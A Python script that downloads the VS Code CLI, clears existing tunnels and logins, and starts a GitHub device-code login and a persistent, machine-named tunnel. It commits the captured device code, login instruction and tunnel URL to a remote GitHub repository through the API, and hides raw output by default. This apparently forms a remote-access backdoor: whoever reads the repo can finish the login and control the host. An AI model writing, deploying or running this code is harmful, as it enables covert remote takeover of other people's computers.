import base64
import json
import os
import platform
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from datetime import datetime
from pathlib import Path


# Edit these values while testing.
GITHUB_TOKEN = "Insert token here"
GITHUB_REPO = "leanne-townsend/temp1"
TARGET_FILE = "output1.txt"
BRANCH = "main"

# Change CODE_DIR if the CLI binary lives somewhere else, such as AppData\Roaming.
CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
CODE_EXE = CODE_DIR / CODE_EXE_NAME
TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
SHOW_RAW_OUTPUT = False

DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
URL_PATTERN = re.compile(r"https://[^\s]+")
TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)


class VSCodeDownloader:
    def __init__(self, target_dir: Path, executable_name: str):
        self.target_dir = Path(target_dir)
        self.executable_name = executable_name
        self.executable_path = self.target_dir / executable_name

    def detect_platform_target(self) -> str:
        system_name = platform.system().lower()
        machine = platform.machine().lower()

        if system_name == "windows":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-win32-{arch}"
        if system_name == "darwin":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-darwin-{arch}"
        if system_name == "linux":
            arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
            return f"cli-linux-{arch}"

        raise RuntimeError(f"Unsupported platform for VS Code CLI download: {platform.system()} {platform.machine()}")

    def locate_downloaded_executable(self) -> Path | None:
        candidates = [
            self.target_dir / self.executable_name,
            self.target_dir / "code.exe",
            self.target_dir / "code",
            self.target_dir / "bin" / "code",
            self.target_dir / "bin" / "code.exe",
        ]

        for candidate in candidates:
            if candidate.exists():
                return candidate

        if platform.system().lower() == "windows":
            for candidate in self.target_dir.glob("code*.exe"):
                if candidate.is_file():
                    return candidate
        else:
            for candidate in self.target_dir.rglob("code*"):
                if candidate.is_file() and candidate.name.startswith("code"):
                    return candidate

        return None

    def setup(self) -> None:
        self.target_dir.mkdir(parents=True, exist_ok=True)
        print(f"[INFO] VS Code CLI directory: {self.target_dir}")

        if self.executable_path.exists():
            print(f"[INFO] {self.executable_name} already exists.")
            return

        platform_target = self.detect_platform_target()
        download_url = f"https://update.code.visualstudio.com/latest/{platform_target}/stable"
        archive_path = self.target_dir / "vscode_cli_download.zip"

        print(f"[DOWNLOAD] Fetching VS Code CLI for {platform_target}...")

        try:
            with urllib.request.urlopen(download_url, timeout=90) as response:
                with archive_path.open("wb") as archive_file:
                    while chunk := response.read(8192):
                        archive_file.write(chunk)

            with zipfile.ZipFile(archive_path, "r") as archive:
                archive.extractall(self.target_dir)

            downloaded_executable = self.locate_downloaded_executable()
            if downloaded_executable is None:
                raise FileNotFoundError("Downloaded archive did not contain a usable VS Code CLI executable.")

            if downloaded_executable.resolve() != self.executable_path.resolve():
                if self.executable_path.exists():
                    self.executable_path.unlink()
                downloaded_executable.replace(self.executable_path)

            print(f"[SUCCESS] {self.executable_name} ready at {self.executable_path}")
        finally:
            if archive_path.exists():
                archive_path.unlink()


def print_summary(details: dict[str, str | None]) -> None:
    print("\n=== Tunnel Summary ===")
    for label, key in (
        ("Tunnel machine name", "machine_name"),
        ("Login instruction", "login_instruction"),
        ("Device code", "device_code"),
        ("Tunnel URL", "tunnel_url"),
    ):
        value = details.get(key)
        if value:
            print(f"{label}: {value}")


def build_summary_text(details: dict[str, str | None]) -> str:
    timestamp = datetime.now().isoformat(timespec="seconds")
    lines = [f"[{timestamp}] Tunnel Summary"]

    for label, key in (
        ("Tunnel machine name", "machine_name"),
        ("Login instruction", "login_instruction"),
        ("Device code", "device_code"),
        ("Tunnel URL", "tunnel_url"),
    ):
        value = details.get(key)
        if value:
            lines.append(f"{label}: {value}")

    return "\n" + "\n".join(lines) + "\n"


def sync_summary_to_github(details: dict[str, str | None], reason: str) -> None:
    result = append_to_github_file(
        repo=GITHUB_REPO,
        file_path=TARGET_FILE,
        branch=BRANCH,
        token=GITHUB_TOKEN,
        text_to_append=build_summary_text(details),
    )
    commit_sha = result.get("commit", {}).get("sha", "unknown")
    print(f"Tunnel info updated on GitHub after {reason}. Commit: {commit_sha}")


def run_command(command: list[str], check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command,
        check=check,
        text=True,
        capture_output=True,
        encoding="utf-8",
        errors="replace",
    )


def trim_ansi(text: str) -> str:
    return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)


def build_file_api_url(repo: str, file_path: str) -> str:
    encoded_path = urllib.parse.quote(file_path, safe="/")
    return f"https://api.github.com/repos/{repo}/contents/{encoded_path}"


def github_request(url: str, token: str, method: str = "GET", payload: dict | None = None) -> dict:
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "combined-tunnel-script",
    }

    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode("utf-8")

    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(request, timeout=30) as response:
        return json.loads(response.read().decode("utf-8"))


def get_existing_file(repo: str, file_path: str, branch: str, token: str) -> tuple[str, str | None]:
    url = build_file_api_url(repo, file_path) + "?" + urllib.parse.urlencode({"ref": branch})

    try:
        response = github_request(url, token, method="GET")
    except urllib.error.HTTPError as error:
        if error.code == 404:
            return "", None
        error_body = error.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"GitHub read failed: {error.code} {error.reason} - {error_body}") from error

    encoded_content = response.get("content", "").replace("\n", "")
    current_text = base64.b64decode(encoded_content).decode("utf-8") if encoded_content else ""
    return current_text, response.get("sha")


def append_to_github_file(repo: str, file_path: str, branch: str, token: str, text_to_append: str) -> dict:
    current_text, sha = get_existing_file(repo, file_path, branch, token)
    new_text = current_text + text_to_append
    encoded_content = base64.b64encode(new_text.encode("utf-8")).decode("utf-8")

    payload = {
        "message": f"Append tunnel summary to {file_path}",
        "content": encoded_content,
        "branch": branch,
    }
    if sha:
        payload["sha"] = sha

    try:
        return github_request(build_file_api_url(repo, file_path), token, method="PUT", payload=payload)
    except urllib.error.HTTPError as error:
        error_body = error.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"GitHub write failed: {error.code} {error.reason} - {error_body}") from error


def ensure_code_cli() -> None:
    downloader = VSCodeDownloader(CODE_DIR, CODE_EXE_NAME)
    downloader.setup()

    if not CODE_EXE.exists():
        raise FileNotFoundError(f"{CODE_EXE_NAME} was not found at {CODE_EXE}")


def validate_github_config() -> None:
    if "/" not in GITHUB_REPO:
        raise ValueError("GITHUB_REPO must look like 'owner/repo'.")
    if not GITHUB_TOKEN or GITHUB_TOKEN == "replace-with-your-github-token":
        raise ValueError("Set GITHUB_TOKEN before running this script.")


def close_existing_tunnel() -> None:
    print("Closing any existing tunnel...")
    result = run_command([str(CODE_EXE), "tunnel", "kill"], check=False)
    if result.stdout.strip():
        print(result.stdout.strip())
    if result.stderr.strip():
        print(result.stderr.strip())


def logout_existing_login() -> None:
    print("Clearing any previous tunnel login...")
    result = run_command([str(CODE_EXE), "tunnel", "user", "logout"], check=False)
    if result.stdout.strip():
        print(result.stdout.strip())
    if result.stderr.strip():
        print(result.stderr.strip())


def login_with_github() -> dict[str, str | None]:
    print("Starting GitHub authentication...")
    process = subprocess.Popen(
        [str(CODE_EXE), "tunnel", "user", "login", "--provider", "github"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        text=True,
        bufsize=1,
        encoding="utf-8",
        errors="replace",
    )

    details: dict[str, str | None] = {
        "machine_name": TUNNEL_NAME,
        "login_instruction": None,
        "device_code": None,
        "tunnel_url": None,
    }
    summary_printed = False
    github_synced = False

    try:
        assert process.stdout is not None
        for line in process.stdout:
            line = line.rstrip()
            cleaned_line = trim_ansi(line)
            if line and SHOW_RAW_OUTPUT:
                print(line)

            if details["login_instruction"] is None and "log into" in cleaned_line.lower() and "use code" in cleaned_line.lower():
                details["login_instruction"] = cleaned_line

            if details["device_code"] is None:
                match = DEVICE_CODE_PATTERN.search(cleaned_line.upper())
                if match:
                    details["device_code"] = match.group(1).replace("-", "")

            url_match = URL_PATTERN.search(cleaned_line)
            if details["login_instruction"] is None and url_match and LOGIN_HINT_PATTERN.search(url_match.group(0)):
                details["login_instruction"] = cleaned_line

            if not summary_printed and (details["login_instruction"] or details["device_code"]):
                print_summary(details)
                sync_summary_to_github(details, "device code capture")
                print("Waiting for GitHub browser authentication to complete...")
                summary_printed = True
                github_synced = True

        exit_code = process.wait()
        if exit_code != 0:
            raise RuntimeError("GitHub authentication command failed.")
    finally:
        if process.poll() is None:
            process.terminate()

    if not github_synced and (details["login_instruction"] or details["device_code"]):
        print_summary(details)
        sync_summary_to_github(details, "login stage")

    return details


def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
    print("Creating a new tunnel...")
    process = subprocess.Popen(
        [
            str(CODE_EXE),
            "tunnel",
            "--no-sleep",
            "--accept-server-license-terms",
            "--name",
            TUNNEL_NAME,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        text=True,
        bufsize=1,
        encoding="utf-8",
        errors="replace",
    )

    uploaded = False
    recent_lines: list[str] = []

    try:
        assert process.stdout is not None
        for line in process.stdout:
            line = line.rstrip()
            cleaned_line = trim_ansi(line)
            if cleaned_line:
                recent_lines.append(cleaned_line)
                recent_lines = recent_lines[-12:]
            if line and SHOW_RAW_OUTPUT:
                print(line)

            if summary_details["tunnel_url"] is None:
                tunnel_match = TUNNEL_URL_PATTERN.search(cleaned_line)
                if tunnel_match:
                    summary_details["tunnel_url"] = tunnel_match.group(0).rstrip(".)")
                    print_summary(summary_details)
                    sync_summary_to_github(summary_details, "tunnel URL detection")
                    uploaded = True

        exit_code = process.wait()
        if exit_code != 0:
            diagnostic = "\n".join(recent_lines) if recent_lines else "No tunnel output captured."
            raise RuntimeError(f"Tunnel command failed.\nRecent output:\n{diagnostic}")
    except KeyboardInterrupt:
        print("\nStopping tunnel...")
        process.terminate()
    finally:
        if process.poll() is None:
            process.wait(timeout=10)

    if not uploaded:
        print("Tunnel ended before a tunnel URL was detected, so nothing was sent to GitHub.")


def main() -> None:
    ensure_code_cli()
    validate_github_config()
    close_existing_tunnel()
    logout_existing_login()

    summary_details = login_with_github()
    print("Complete the GitHub sign-in in the browser, then the tunnel will continue.")
    start_tunnel_and_upload(summary_details)


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"Error: {error}", file=sys.stderr)
        sys.exit(1)
